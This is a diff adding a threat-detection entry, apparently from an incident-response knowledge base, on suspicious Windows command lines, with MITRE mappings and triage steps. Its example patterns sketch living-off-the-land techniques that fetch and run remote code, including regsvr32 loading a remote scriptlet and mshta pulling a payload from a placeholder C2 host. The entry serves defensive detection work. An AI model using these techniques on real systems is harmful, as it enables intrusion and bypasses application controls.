@@ -1,0 +1,8 @@
+# Suspicious Command-Line Arguments
+category: Process
+what_you_see: "cmd.exe /c piping to powershell -enc base64; rundll32.exe javascript: mshtml RunHTMLApplication; regsvr32.exe with /i:http://IP/file.sct scrobj.dll; mshta.exe http://C2/payload.hta"
+interpretation: "Living-off-the-land execution. Attacker uses signed Microsoft binaries to execute malicious code, bypassing application whitelisting."
+mitre_attack: ["T1218", "T1027", "T1059.001"]
+confidence_rule: "HIGH for encoded base64; MEDIUM for complex but potentially legitimate args"
+next_step: "Decode base64 payload. Extract C2 URL from command line. Check parent process chain."
+triage_tier: true
